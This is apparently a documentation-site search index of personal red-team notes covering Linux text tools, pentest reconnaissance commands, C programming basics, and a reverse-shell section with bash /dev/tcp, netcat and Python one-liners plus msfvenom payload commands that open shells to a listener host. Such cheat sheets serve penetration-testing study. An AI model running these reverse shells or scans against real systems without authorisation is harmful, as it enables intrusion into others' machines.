{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Environment Configuration","text":"<ul> <li>ida pro</li> <li>x96dbg</li> <li>010editor</li> <li>vmware workstation<ul> <li>windows</li> <li>kali linux</li> </ul> </li> <li>visual studio 2017<ul> <li>microsoft runtime library</li> </ul> </li> <li>clion</li> <li>pycharm</li> </ul>"},{"location":"Crypto/","title":"Index","text":"<p>All things about cryptography in red teaming.</p>"},{"location":"Linux/","title":"Details","text":"<p>tools:</p> <ul> <li> regexp</li> <li> grep</li> <li> sed</li> <li> awk</li> </ul> <p>shell:</p> <ul> <li>unlisted</li> </ul>"},{"location":"Linux/tools/grep/","title":"grep","text":"<p>SYNOPSIS</p> <pre><code>grep [opts] [pattern] file\n    -i: ignore\n    -o: only print matched\n    -v, --invert-match\n    -E: enable regexp\n    -q, --quite, --silent\n    -n: number line\n    -c: count output line\n</code></pre>"},{"location":"Linux/tools/regexp/","title":"Regular Expression","text":""},{"location":"Linux/tools/regexp/#basic-regexp","title":"Basic regexp","text":"<ul> <li>\u5339\u914d\u5b57\u7b26</li> <li>\u5339\u914d\u6b21\u6570</li> <li>\u4f4d\u7f6e\u951a\u5b9a</li> </ul> \u7b26\u53f7 \u4f5c\u7528 ^ \u5339\u914d\u884c\u5f00\u5934 $ \u5339\u914d\u884c\u7ed3\u5c3e ^$ \u7a7a\u884c . \u5339\u914d\u4e00\u4e2a\u5b57\u7b26 \\ \u8f6c\u4e49\u5b57\u7b26 * \u5339\u914d\u524d\u4e00\u4e2a\u5b57\u7b260\u6b21\u53ca\u4ee5\u4e0a .* \u5339\u914d\u6240\u6709\u5185\u5bb9 ^.* \u5339\u914d\u4efb\u610f\u591a\u4e2a\u5b57\u7b26\u5f00\u5934\u7684\u5185\u5bb9 .*$ \u5339\u914d\u4efb\u610f\u591a\u4e2a\u5b57\u7b26\u7ed3\u5c3e\u7684\u5185\u5bb9 [abc] \u5339\u914d\u96c6\u5408\u5185\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26 [^abc] \u5339\u914d\u9664\u4e86\u96c6\u5408\u5185\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26"},{"location":"Linux/tools/regexp/#extensive-regexp","title":"Extensive regexp","text":"<p><code>grep -E</code></p> \u7b26\u53f7 \u4f5c\u7528 + \u5339\u914d\u524d\u4e00\u4e2a\u5b57\u7b261\u6b21\u53ca\u4ee5\u4e0a ? \u5339\u914d\u524d\u4e00\u4e2a\u5b57\u7b260\u6b21\u62161\u6b21 | \u6216\u8005 () \u5206\u7ec4\u8fc7\u6ee4\uff0c\u5206\u7ec4\u7684\u5185\u5bb9\u53ef\u540e\u7eed\"\\n\"\u5f15\u7528 a{n} a{n,m} a{n,} a{,m} \u5339\u914d\u524d\u4e00\u4e2a\u5b57\u7b26\u7279\u5b9a\u6b21\u6570"},{"location":"Linux/tools/sed/","title":"sed","text":"<p>SYNOPSIS</p> <pre><code>sed [opts] [cmd chars] [file]\n</code></pre> <p>Opts</p> \u53c2\u6570 \u4f5c\u7528 -n \u53d6\u6d88\u9ed8\u8ba4\u7684sed\u8f93\u51fa\uff0c\u5e38\u4e0ep\u4e00\u8d77\u4f7f\u7528 -i \u4fee\u6539\u7ed3\u679c\u76f4\u63a5\u5199\u5165\u6587\u4ef6 -e \u591a\u6b21\u7f16\u8f91\uff08\u4e0d\u9002\u7528\u7ba1\u9053\u7b26\uff09 -r \u6269\u5c55\u7248\u6b63\u5219 <p>\u5185\u7f6e\u547d\u4ee4\u5b57\u7b26</p> sed\u5185\u7f6e \u4f5c\u7528 a append\uff0c\u6307\u5b9a\u884c\u6dfb\u52a0\u4e00\u884c\u53ca\u4ee5\u4e0a\u6587\u672c d delete\uff0c\u5220\u9664\u5339\u914d\u884c i insert\uff0c\u6307\u5b9a\u884c\u524d\u6dfb\u52a0\u4e00\u884c\u53ca\u4ee5\u4e0a\u6587\u672c p print\uff0c\u6253\u5370\u5339\u914d\u884c\u5185\u5bb9 s/regexp/text/g \u5339\u914d\u6b63\u5219\u5185\u5bb9\uff0c\u66ff\u6362\u5185\u5bb9\uff0cg\u5168\u5c40\u5339\u914d <p>\u5339\u914d\u8303\u56f4</p> \u8303\u56f4 \u89e3\u6790 \u7a7a\u5730\u5740 \u5168\u6587\u5904\u7406 \u5355\u5730\u5740 \u6307\u5b9a\u6587\u4ef6\u67d0\u4e00\u884c /pattern/ \u88ab\u6a21\u5f0f\u5339\u914d\u5230\u7684\u6bcf\u4e00\u884c \u8303\u56f4\u533a\u95f4 10,20 10,+5 /pattern1/,/pattern2/ \u6b65\u957f 1~2, 2~2, start~step"},{"location":"Pentest/","title":"Details","text":"<p>Core pentest procedures:</p> <ul> <li>Reconnaissance</li> <li>Vulnerabilities</li> <li>Services</li> <li>Privilege Escalation<ul> <li>Linux</li> <li>Windows</li> </ul> </li> </ul> <p>Auxiliary points:</p> <ul> <li>Reverse shell</li> <li>Quick server</li> </ul>"},{"location":"Pentest/#helper-tools","title":"Helper tools","text":"<ul> <li>arsenal, <code>pip install arsenal-cli</code></li> </ul>"},{"location":"Pentest/1.recon/","title":"Index","text":"<ul> <li>nmap</li> </ul> <pre><code>nmap -sn &lt;ip&gt;/24 # arp, arp-scan -l\nnmap -sn --send-ip &lt;ip&gt;/24 # icmp\nnmap -sT --min-rate 10000 -p- &lt;ip&gt; -oA &lt;ports&gt; # | grep open | awk -F '/' '{print $1}' | paste -sd ','\n\nnmap -sT -sV -sC -O -p&lt;ports&gt; &lt;ip&gt; -oA &lt;file&gt;\nnmap -sU --top-ports 20 &lt;ip&gt; -oA &lt;file&gt;\nnmap --script=vuln -p&lt;ports&gt; &lt;ip&gt; -oA &lt;file&gt;\n\nnmap -6 --min-rate 10000 -p- &lt;ip&gt; -oA &lt;file&gt;\n</code></pre> <ul> <li>searchsploit</li> </ul> <pre><code>searchsploit &lt;dsc&gt;\nsearchsploit &lt;dsc&gt; -m &lt;num&gt;\n</code></pre>"},{"location":"Pentest/1.recon/cdn/","title":"CDN","text":"<ul> <li>online ping<ul> <li>http://ping.chinaz.com/</li> <li>http://ping.aizhan.com/</li> <li>http://ce.cloud.360.cn/</li> <li>https://ip.tool.chinaz.com/</li> <li>https://get-site-ip.com/</li> <li>https://tools.ipip.net/cdn.php/</li> </ul> </li> <li>nslookup"},{"location":"Pentest/1.recon/dns/","title":"DNS","text":"<ul> <li>local host config<ul> <li>linux/unix/macos: <code>/etc/resolv.conf</code></li> <li>windows: <code>%windir%\\system32\\drivers\\etc\\hosts</code></li> </ul> </li> <li>dig <pre><code>dig @&lt;dns&gt; &lt;domain&gt; [+short]\n</code></pre></li> <li>nslookup <pre><code>nslookup [-qt=A|AAAA|CNAME|MX|.] &lt;target.com&gt; &lt;dns&gt;\n</code></pre></li> <li>whois <pre><code>whois &lt;target.com&gt;\n</code></pre></li> <li>theHaverster<ul> <li>email</li> <li>subdomain</li> <li>name <pre><code>theHarvester -d $DOMAIN_NAME -b google\n</code></pre></li> </ul> </li> <li>crt.sh</li> </ul>"},{"location":"Pentest/1.recon/dns/#domain","title":"Domain","text":"<ul> <li>netcraft: search web by domain</li> </ul>"},{"location":"Pentest/1.recon/dns/#subdomain","title":"Subdomain","text":"<ul> <li>gobuster <pre><code># fzf-wordlists\n/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n# gobuster\ngobuster dns   -u &lt;http://target.com&gt; -w /path/to/wordlist.txt --append-domain -t $THREAD_NUM\ngobuster vhost -u &lt;http://target.com&gt; -w /path/to/wordlist.txt --append-domain -t $THREAD_NUM\n</code></pre></li> </ul>"},{"location":"Pentest/1.recon/os/","title":"OS","text":"<ul> <li>web yes<ul> <li>Windows\u5927\u5c0f\u5199\u4e0d\u654f\u611f</li> <li>\u5de5\u5177\u8bc6\u522b</li> </ul> </li> <li>web no<ul> <li>nmap -O</li> </ul> </li> <li>TTL (not accurate)</li> </ul> <pre><code>1\u3001WINDOWS NT/2000   TTL\uff1a128\n2\u3001WINDOWS 95/98     TTL\uff1a32\n3\u3001UNIX              TTL\uff1a255\n4\u3001LINUX             TTL\uff1a64\n5\u3001WIN7              TTL\uff1a64\n</code></pre> <ul> <li>special port: 22, 139, 445, 1433, 3389</li> </ul>"},{"location":"Pentest/1.recon/path/","title":"Path","text":"<ul> <li>gobuster</li> </ul> <pre><code>sudo gobuster dir -u &lt;ip&gt; --worlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.t -x html,php\n</code></pre> <ul> <li>dirb</li> </ul> <pre><code>dirb &lt;ip&gt;\n</code></pre> <ul> <li>dirsearch</li> </ul> <pre><code>dirsearch -u &lt;ip&gt; -e &lt;ext&gt; [opts]\n\n-t &lt;thead&gt;\n-r, brute-force recursively\n-i &lt;code&gt;, include status codes\n-x &lt;codes&gt;, exclude status codes\n-m &lt;method&gt;\n-d &lt;data&gt;\n-H &lt;headers&gt;\n--user-agent=&lt;ua&gt;\n--cookie=&lt;ck&gt;\n</code></pre> <ul> <li>ffuf</li> </ul> <pre><code>ffuf -fs 185 -c -w \\$(fzf-wordlists) -H 'Host: FUZZ.org' -u \"http://$TARGET/\"\nffuf -w /usr/share/dirb/wordlists/common.txt -fc 403,404 -fs 185 -u \"http://$TARGET/FUZZ\" -p 1\n</code></pre> <ul> <li>wfuzz</li> </ul> <pre><code>wfuzz -c -w &lt;dict&gt; --hc 404 &lt;url&gt;?FUZZ=sth\n</code></pre> <ul> <li>feroxbuster</li> </ul> <pre><code>feroxbuster -u &lt;target.com&gt; -x pdf -w &lt;word&gt; -t 50\n</code></pre> <ul> <li>nikto</li> </ul> <pre><code>nikto -h &lt;target.com&gt; -mutate 1 -mutate-options /path/to/dictionary.txt\n</code></pre>"},{"location":"Pentest/1.recon/smb/","title":"SMB","text":"<ul> <li>enum4linux</li> </ul> <pre><code>enum4linux -A &lt;ip&gt;\n</code></pre>"},{"location":"Pentest/1.recon/waf/","title":"WAF","text":"<ul> <li>waf00f</li> <li>identYwaf</li> <li>nmap<ul> <li>nmap --script=http-waf-fingerprint</li> <li>nmap --script=http-waf-detect</li> </ul> </li> </ul>"},{"location":"Pentest/1.recon/web/","title":"Web","text":"<ul> <li>whatweb</li> </ul> <pre><code>whatweb [opts] &lt;urls&gt;\n</code></pre> <ul> <li>nikto</li> </ul> <pre><code>nikto -h &lt;taget&gt; -p &lt;port&gt; -C all [-useproxy &lt;ip:port&gt;] \\\n    [-id admin:passwd] [-Plugins +apacheversion] [-ssl] -o &lt;output&gt;\n</code></pre>"},{"location":"Pentest/2.rshell/","title":"Online help","text":"<p>Online rshell</p> <ul> <li>Reverse Shell Generator (revshells.com)</li> </ul> <p>Online shell check</p> <ul> <li>ShellCheck \u2013 shell script analysis tool</li> <li>explainshell.com - match command-line arguments to their help text</li> </ul>"},{"location":"Pentest/2.rshell/#better-shell","title":"Better shell","text":"<pre><code># Host\nrlwrap sudo nc -lvnp 4444\n# Remote\nexport TERM=xterm-color\ndpkg -l | grep python\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\n##ctrl+z\nstty raw -echo; fg\n</code></pre>"},{"location":"Pentest/2.rshell/#reverse-shell","title":"Reverse Shell","text":"<p>msf gen</p> <p><pre><code>msfvenom -p cmd/unix/reverse_python lhost=&lt;ip&gt; lport=&lt;port&gt; -f raw\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;Host&gt; LPORT=&lt;p&gt; -f elf -o rshell.elf\n</code></pre> several langs</p> <pre><code>bash -i &gt;&amp; /dev/tcp/&lt;local&gt;/2233 0&gt;&amp;1\n\nnc -e /bin/sh &lt;host&gt; 4444\n\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n</code></pre>"},{"location":"Pentest/3.quick_server/","title":"Index","text":"<pre><code>python -m http.server 80\n\nphp -S 0:80\n\nruby -run -ehttpd . -p80\n\nperl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick-&gt;new(port=&gt;80); $s-&gt;mount(\"/\"=&gt;{path=&gt;\".\"}); $s-&gt;start'\n\n# cargo install simple-http-server\nsimple-http-server -p 80\n\n# npm install -g http-server\nhttp-server -p 80\n</code></pre>"},{"location":"Pentest/4.services/","title":"Index","text":"<p>Common-used services installed for different uses.</p> <ul> <li> SSH</li> <li> WordPress</li> <li> Jetkeins</li> <li> SMB</li> <li> FTP</li> <li> RPC</li> <li> Kerberos</li> </ul>"},{"location":"Pentest/5.vulns/","title":"Index","text":"<p>Vulnerabilities might be used during pentest.</p> <ul> <li> File inclusion</li> <li> SQLi</li> <li> Shellshock</li> </ul>"},{"location":"Pentest/6.priviledge_escalation_linux/","title":"Index","text":"<p>All things about PriEsc on Linux.</p>"},{"location":"RE/","title":"RE","text":"<ul> <li> Langs<ul> <li> C</li> <li> C++</li> <li> Python</li> </ul> </li> <li> Data Structure</li> <li> Algorithms</li> <li> STL</li> <li> BOOST</li> <li> Concurrent Progrm</li> <li> Windows Internals<ul> <li> SDK</li> <li> MFC</li> <li> System Progrm</li> <li> PE</li> </ul> </li> <li> RE Details<ul> <li> x86/64 Asm</li> <li> C/C++ RE</li> <li> Anti-reversing Techniques</li> <li> Malware Analysis</li> </ul> </li> <li> Network<ul> <li> Principles</li> <li> Windows Network Progrm</li> </ul> </li> </ul>"},{"location":"RE/langs/C/","title":"C Programming","text":""},{"location":"RE/langs/C/#_1","title":"\u57fa\u7840\u77e5\u8bc6","text":""},{"location":"RE/langs/C/#c","title":"C\u8bed\u8a00\u6807\u51c6","text":"<ul> <li>K&amp;R</li> <li>C89/C90</li> <li>C99</li> <li>C11</li> </ul>"},{"location":"RE/langs/C/#c_1","title":"C\u4ee3\u7801\u7f16\u5199\u6b65\u9aa4","text":"<ol> <li>\u786e\u5b9a\u9700\u6c42</li> <li>\u8bbe\u8ba1\u7a0b\u5e8f</li> <li>\u7f16\u5199\u4ee3\u7801</li> <li>\u8fd0\u884c</li> <li>\u6d4b\u8bd5\u548c\u8c03\u8bd5</li> <li>\u7ef4\u62a4\u548c\u4fee\u6539</li> </ol>"},{"location":"RE/langs/C/#_2","title":"\u4e8c\u8fdb\u5236\u4ee3\u7801\u751f\u6210\u6b65\u9aa4","text":"<ol> <li>\u9884\u5904\u7406\uff1a\u590d\u5236\u5934\u6587\u4ef6\u5185\u5bb9\uff0c\u66ff\u6362\u5b8f\u7684\u5185\u5bb9\u7b49</li> <li>\u7f16\u8bd1\uff1a\u5c06C\u4ee3\u7801\u7f16\u8bd1\u4e3a\u6c47\u7f16\u4ee3\u7801</li> <li>\u6c47\u7f16\uff1a\u5c06\u6c47\u7f16\u4ee3\u7801\u6c47\u7f16\u4e3a\u4e8c\u8fdb\u5236\u4ee3\u7801</li> <li>\u94fe\u63a5\uff1a\u52a0\u8f7d\u542f\u52a8\u4ee3\u7801\u548c\u5e93\u6587\u4ef6\u7b49</li> </ol> <pre><code># preprocess\ngcc -E a.c -o a.i\n# compile\ngcc -S a.i -o a.s\n# assemble\ngcc -c a.s -o a.o\n# link\ngcc a.o -o a.out\n</code></pre> <pre><code># 32bit compile\ngcc a.c -m32\n# dependencies:\nsudo apt install build-essential gcc-multilib g++-multilib gcc g++\n</code></pre>"},{"location":"RE/langs/C/#_3","title":"\u8fdb\u5236\u548c\u4f4d","text":"<p>\u8fdb\u5236</p> <ul> <li>bin</li> <li>oct</li> <li>dec</li> <li>hex</li> </ul> <p>\u4f4d</p> <ul> <li>32bit</li> <li>64bit</li> </ul> <p>\u5b57\u5bbd</p> <ul> <li>QWORD 64bit</li> <li>FWORD 48bit</li> <li>DWORD 32bit</li> <li>WORD 16bit</li> <li>BIT 1bit</li> </ul>"},{"location":"RE/langs/C/#vs","title":"VS\u5e38\u89c4\u64cd\u4f5c","text":"<ul> <li>F5 \u8fd0\u884c</li> <li>F9 \u65ad\u70b9</li> <li>F10 \u5355\u6b65\u6b65\u8fc7</li> <li>F11 \u5355\u6b65\u6b65\u5165</li> </ul>"},{"location":"RE/langs/C/#clion","title":"Clion\u5e38\u89c4\u64cd\u4f5c","text":"<p>\u5236\u4f5c\u56fe\u6807\uff1a</p> /usr/share/applications<pre><code>[Desktop Entry]\nEncoding=UTF-8\nName=Clion\nComment=Clion-2023.2\nExec=/home/kali/opt/clion-2023.2/bin/clion.sh\nIcon=/home/kali/opt/clion-2023.2/bin/clion.svg\nCategories=Application;Development;Java;IDE\nVersion=2023.2\nType=Application\n</code></pre> <p>\u5e38\u89c4\u64cd\u4f5c\uff1a</p> <ul> <li>Shift + F10 run</li> <li>Shift + F9 debug</li> <li>F7 \u6b65\u5165</li> <li>F8 \u6b65\u8fc7</li> </ul>"},{"location":"RE/langs/C/#windows-api","title":"Windows API","text":"<ul> <li>A: Ascii</li> <li>W: Unicode</li> <li>Ex: Extended version</li> </ul>"},{"location":"RE/langs/C/#_4","title":"\u57fa\u7840\u6570\u636e\u7c7b\u578b","text":""},{"location":"RE/langs/C/#_5","title":"\u57fa\u7840\u6570\u636e\u7c7b\u578b","text":""},{"location":"RE/langs/C/#_6","title":"\u6574\u6570","text":"<ul> <li>short, 2B</li> <li>int, 4B</li> <li>long, 4B</li> <li>long long, 8B(x64)</li> </ul>"},{"location":"RE/langs/C/#_7","title":"\u6d6e\u70b9\u6570","text":"<ul> <li>float, 4B</li> <li>double, 8B</li> </ul>"},{"location":"RE/langs/C/#_8","title":"\u5b57\u7b26 \u5b57\u7b26\u4e32","text":"<ul> <li>char (ascii), 1B</li> <li>wchar_t (unicode), 2B</li> </ul> <p>sz on windows: string terminated with a zero</p> <pre><code>char szBuffer[] = \"hello\";\nchar *szBuffer  = \"hello\";\nwchar_t szBuffer[] = L\"hello\";\nwchar_t *szBuffer  = L\"hello\";\n</code></pre>"},{"location":"RE/langs/C/#_9","title":"\u7ed3\u6784\u7c7b\u578b","text":"<ul> <li>struct</li> <li>union</li> <li>enum</li> </ul>"},{"location":"RE/langs/C/#_10","title":"\u7279\u6b8a\u7c7b\u578b","text":"<ul> <li>auto</li> <li>void</li> <li>[]</li> <li> <ul> <li></li> </ul> </li> </ul>"},{"location":"RE/langs/C/#_11","title":"\u7c7b\u578b\u4fee\u9970","text":"<ul> <li>static</li> <li>signed</li> <li>unsigned</li> <li>const</li> </ul>"},{"location":"RE/langs/C/#_12","title":"\u53d8\u91cf","text":"<p>\u53d8\u91cf\u540d\u89c4\u5219\uff1a</p> <ul> <li>\u4ee5\u82f1\u6587\u5b57\u7b26\u6216\u8005\u4e0b\u5212\u7ebf\u8d77\u59cb</li> <li>\u4e0d\u80fd\u5305\u542b \u7a7a\u683c\u3001\u6807\u70b9\u3001\u7c7b\u578b\u8bf4\u660e\u7b26\u3001\u8fd0\u7b97\u7b26</li> <li>\u5b57\u6bcd\u533a\u5206\u5927\u5c0f\u5199</li> <li>\u6709\u6548\u957f\u5ea6max 255</li> <li>\u4e0d\u80fd\u662f\u5173\u952e\u5b57</li> </ul> <p>\u547d\u540d\u65b9\u6cd5\uff1a</p> <ul> <li>\u5308\u7259\u5229</li> <li>\u9a7c\u5cf0</li> </ul> <p>\u53d8\u91cf\u7c7b\u578b\uff1a</p> <ul> <li>\u5168\u5c40\u53d8\u91cf</li> <li>\u5c40\u90e8\u53d8\u91cf</li> <li>\u9759\u6001\u53d8\u91cf</li> </ul>"},{"location":"RE/langs/C/#_13","title":"\u8f93\u5165\u548c\u8f93\u51fa","text":""},{"location":"RE/langs/C/#_14","title":"\u8f93\u51fa","text":"<p>printf</p> <ul> <li>%c, %s, %S</li> <li>%u, %d (int), %lld (long long)</li> <li>%e, %f</li> <li>%x, %X</li> <li>%p</li> </ul> <p>\u8f6c\u4e49\u5b57\u7b26</p> <ul> <li>\\r \\n \\t</li> <li>\\ \\\u2019 \\\u201d \\?</li> </ul> <p>sprintf</p> <pre><code>sprintf(szBuffer, \"hello %s!\", szName);\n</code></pre>"},{"location":"RE/langs/C/#_15","title":"\u8f93\u5165","text":"<p>scanf</p> <ul> <li>\u201c%d\u201d, &amp;nNumber</li> <li>\u201c%s\u201d, szBuffer</li> </ul>"},{"location":"RE/langs/C/#_16","title":"\u8fd0\u7b97\u7b26","text":""},{"location":"RE/langs/C/#_17","title":"\u7b97\u6570\u8fd0\u7b97\u7b26","text":"<ul> <li>=</li> <li>==, \u2260, &lt;, \u2264, &gt;, \u2265</li> <li>+, -, *, /, %</li> <li>++, \u2014</li> <li>+=, -=, *=, /=, %=</li> </ul>"},{"location":"RE/langs/C/#_18","title":"\u4f4d\u8fd0\u7b97\u7b26","text":"<ul> <li>&amp;, |, ~, ^</li> <li>&lt;&lt;, &gt;&gt;</li> </ul>"},{"location":"RE/langs/C/#_19","title":"\u903b\u8f91\u8fd0\u7b97\u7b26","text":"<ul> <li>&amp;&amp;, ||, !</li> <li>? :</li> </ul>"},{"location":"RE/langs/C/#_20","title":"\u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7","text":""},{"location":"RE/langs/C/#_21","title":"\u9009\u62e9\u7ed3\u6784","text":"<ul> <li>if () {} else if () {} else {}</li> <li>switch () { case 1: { break; } default: { break; } }</li> <li>goto tag;</li> </ul>"},{"location":"RE/langs/C/#_22","title":"\u5faa\u73af\u7ed3\u6784","text":"<ul> <li>while (expr) {}</li> <li>do {} while (expr)</li> <li>for ( ; ; ) {}</li> </ul>"},{"location":"RE/langs/C/#_23","title":"\u51fd\u6570","text":"<ul> <li>\u58f0\u660e</li> <li>\u5b9a\u4e49</li> <li>\u53c2\u6570</li> <li>\u8fd4\u56de\u503c</li> <li>\u53d8\u53c2\u51fd\u6570</li> </ul>"},{"location":"RE/langs/C/#_24","title":"\u53c2\u6570\u7684\u7ec6\u8282","text":"<ul> <li>\u5f62\u5f0f\u53c2\u6570</li> <li>\u5b9e\u9645\u53c2\u6570</li> <li>\u53d8\u53c2\u51fd\u6570</li> </ul> <pre><code>int test(int optcount, ...)\n{\n    va_list ap;\n    va_start(ap, optcount);\n    int nCount = 0;\n    for (int i = 0; i &lt; optcount; i++)\n    {\n        nCount += va_arg(ap, int);\n    }\n    va_end(ap);\n    return nCount;\n}\n</code></pre>"},{"location":"RE/langs/C/#_25","title":"\u9012\u5f52\u51fd\u6570","text":""},{"location":"RE/langs/C/#_26","title":"\u6570\u7ec4\u6307\u9488","text":"<ul> <li>\u4e00\u7ef4\u6570\u7ec4 <pre><code>int arr[5] = { 0,1,2,3,4 };\nint arr[5] = { [3] = 4 };\nint arr[]  = { 0,1,2,3 };\nint arr[]  = { 1,[5]=2 };\n</code></pre></li> <li>\u591a\u7ef4\u6570\u7ec4</li> </ul> <pre><code>int nArr[2][2] = \n{\n    {0,1},\n    {2,3}\n}\n</code></pre>"},{"location":"RE/langs/C/#_27","title":"\u5b57\u7b26\u4e32","text":""},{"location":"RE/langs/C/#_28","title":"\u58f0\u660e","text":"<pre><code>char szStr[] = { 'a','b','c',0 };\nchar szStr[] = \"abc\";\nchar * szStr = \"abc\";\n</code></pre>"},{"location":"RE/langs/C/#_29","title":"\u5b57\u7b26\u4e32\u64cd\u4f5c","text":"<ul> <li>strcat</li> <li>strcpy</li> <li>strcmp</li> </ul>"},{"location":"RE/langs/C/#_30","title":"\u6307\u9488","text":"<p>\u7b26\u53f7\uff1a</p> <ul> <li>*</li> <li>&amp;</li> <li>\u2192</li> </ul> <p>\u6307\u9488\u8fd0\u7b97\uff1a\u5730\u5740 + \u6570\u636e\u7c7b\u578b\u7684\u5bbd\u5ea6 * n</p> <pre><code>int arr[5] = { 0 };\nint * p = arr;\n// use p\nprintf(\"%d\", *p);\nprintf(\"%d\", p[3]);\n</code></pre> <p>\u51fd\u6570\u6307\u9488</p> <pre><code>int func1(int a);\n\ntypedef int (*FuncType1) (int a);\nFuncType1 pfunc = func1;\npfunc(1);\n</code></pre> <p>\u6570\u7ec4 \u6307\u9488 \u4f5c\u4e3a\u51fd\u6570\u53c2\u6570</p> <pre><code>int addAll(int * arr, int nCount);\nint* addAll(int * arr, int nCount);\nint addAll(int * arr, int nCount, int * nRes);\n</code></pre> <p>\u5185\u5b58\u64cd\u4f5c</p> <ul> <li>char * szBuffer = malloc(sizeof(char) * 100)</li> <li>memset(szBuffer, 0xCC, sizeof(char) * 100)</li> <li>free(szBuffer)</li> </ul>"},{"location":"RE/langs/C/#_31","title":"\u9884\u5904\u7406","text":"<pre><code>#define MAX_VALUE 256\n\n#if EXPR1\n...\n#elif EXPR2\n...\n#else\n...\n#endif\n</code></pre>"},{"location":"RE/langs/C/#_32","title":"\u590d\u6742\u6570\u636e\u7c7b\u578b","text":""},{"location":"RE/langs/C/#_33","title":"\u7ed3\u6784\u4f53","text":"<pre><code>struct _Info\n{\n    char szName[50];\n    int age;\n    char szGender[10];\n};\n\ntypedef struct _Info\n{\n    char szName[50];\n    int age;\n    char szGender[10];\n} Info, *PInfo;\n\ntypedef struct\n{\n    char szName[50];\n    int age;\n    char szGender[10];\n} Info;\n</code></pre> <p>\u7b26\u53f7\uff1a</p> <ul> <li>.</li> <li>\u2192</li> </ul>"},{"location":"RE/langs/C/#_34","title":"\u679a\u4e3e","text":"<pre><code>enum MyEnum\n{\n    one,\n    two,\n    three\n};\n</code></pre>"},{"location":"RE/langs/C/#_35","title":"\u7ed3\u6784\u4f53\u5bf9\u9f50","text":"<p>\u5bf9\u9f501 2 4 8 16</p> <p>MSVC\u9ed8\u8ba4\u5bf9\u9f508 /Zp8</p> <p>\u6210\u5458\u504f\u79fb member offset\uff1a\u76f8\u5bf9\u4e8e\u7ed3\u6784\u4f53\u9996\u5730\u5740\u7684\u504f\u79fb</p> <p>\u5bf9\u9f50\u89c4\u5219\uff1a</p> <ul> <li>member offset % min(ZpValue, sizeof(member type)) == 0</li> <li>size % max(member type) == 0</li> </ul> <p>\u8bbe\u7f6e\u5bf9\u9f50\u957f\u5ea6</p> <pre><code>#pragma pack(1)\n</code></pre>"},{"location":"RE/langs/C/#_36","title":"\u6307\u9488\u8fdb\u9636","text":"<p>\u4e8c\u7ea7\u6307\u9488\uff1a\u6307\u5411\u7684\u6bcf\u4e00\u4e2a\u7a7a\u95f4\u90fd\u662f\u4e00\u4e2a\u4e00\u7ea7\u6307\u9488</p> <p>\u4e8c\u7ea7\u6570\u7ec4\uff1a</p> <pre><code>int nArr[3][4];\nint (*p)[4];\np = nArr;\n// when p + i -&gt; p + sizeof(int) * 4\nfor (size_t i = 0; i &lt; 3; i++)\n    for (size_t j = 0; j &lt; 4; j++)\n        printf(\"%d\\r\\n\", *(p[i] +  k));\n</code></pre>"},{"location":"RE/langs/C/#_37","title":"\u6587\u4ef6\u64cd\u4f5c","text":""},{"location":"RE/langs/C/#_38","title":"\u5199\u6587\u4ef6","text":"<p>fopen(path, mode)</p> <ul> <li>r: \u8bfb\u53d6\uff0c\u6587\u4ef6\u4e0d\u5b58\u5728or\u627e\u4e0d\u5230\u5373\u4e3a\u5931\u8d25</li> <li>w: \u6253\u5f00\u7528\u4e8e\u5199\u5165\u7684\u7a7a\u6587\u4ef6\uff1b\u5982\u679c\u7ed9\u5b9a\u6587\u4ef6\u5b58\u5728\uff0c\u5185\u5bb9\u4f1a\u88ab\u9500\u6bc1</li> <li>a: \u6587\u4ef6\u672b\u5c3e\u8ffd\u52a0\uff1b\u65b0\u6570\u636e\u5199\u5165\u4e4b\u524d\u4e0d\u79fb\u9664EOF\uff1b\u6587\u4ef6\u4e0d\u5b58\u5728\u521b\u5efa\u6587\u4ef6</li> <li>r+: \u8bfb\u53d6\u5199\u5165\u6587\u4ef6\uff0c\u6587\u4ef6\u987b\u5b58\u5728</li> <li>w+: \u8bfb\u53d6\u5199\u5165\u7a7a\u6587\u4ef6\uff1b\u6587\u4ef6\u5b58\u5728\uff0c\u5185\u5bb9\u9500\u6bc1</li> <li>a+: \u8bfb\u53d6\u548c\u8ffd\u52a0\uff1b\u65b0\u8f93\u5165\u5199\u5165\u524d\u79fb\u9664EOF\uff1b\u5199\u5165\u5b8c\u6210\uff0cEOF\u4e0d\u4f1a\u8fd8\u539f\uff1b\u6587\u4ef6\u4e0d\u5b58\u5728\u521b\u5efa\u6587\u4ef6</li> </ul> <pre><code>void WriteFile(char * szFilePath, char * szBuffer)\n{\n    FILE * pFile;\n    if ((pFile = fopen(szFilePath, \"w\")) == NULL)\n    {\n        printf(\"failed to open file.\\r\\n\");\n        fclose(pFile);\n        exit(0);\n    }\n    int nRet = fwrite(szBuffer, sizeof(char) * (strlen(szBuffer) + 1), 1, pFile);\n    fclose(pFile);\n}\n</code></pre>"},{"location":"RE/langs/C/#_39","title":"\u8bfb\u6587\u4ef6","text":"<p>fseek(stream, offset, origin)</p> <ul> <li>SEEK_CUR</li> <li>SEEK_END</li> <li>SEEK_SET</li> </ul> <pre><code>char * ReadFile(char * szFilePath)\n{\n    FILE * pFile;\n    char * szReadBuffer;\n    int nReadFileSize = 0;\n    if ((pFile = fopen(szFilePath, \"r\")) == NULL)\n    {\n        printf(\"failed to read file.\\r\\n\");\n        fclose(pFile);\n        exit(0);\n    }\n    fseek(pFile, 0, SEEK_END);\n    nReadFileSize = ftell(pFile);\n    rewind(pFile);\n    szReadBuffer = malloc(sizeof(char) * (nReadFileSize + 1));\n    if (szReadBuffer == NULL)\n    {\n        printf(\"failed to malloc memory.\\r\\n\");\n        fclose(pFile);\n        exit(0);\n    }\n    memset(szReadBuffer, 0, nReadFileSize);\n    int nResLen = 0;\n    nResLen = fread(szReadBuffer, 1, nReadFileSize, pFile);\n    if (nResLen != nReadFileSize)\n    {\n        printf(\"failed to read file.\\r\\n\");\n        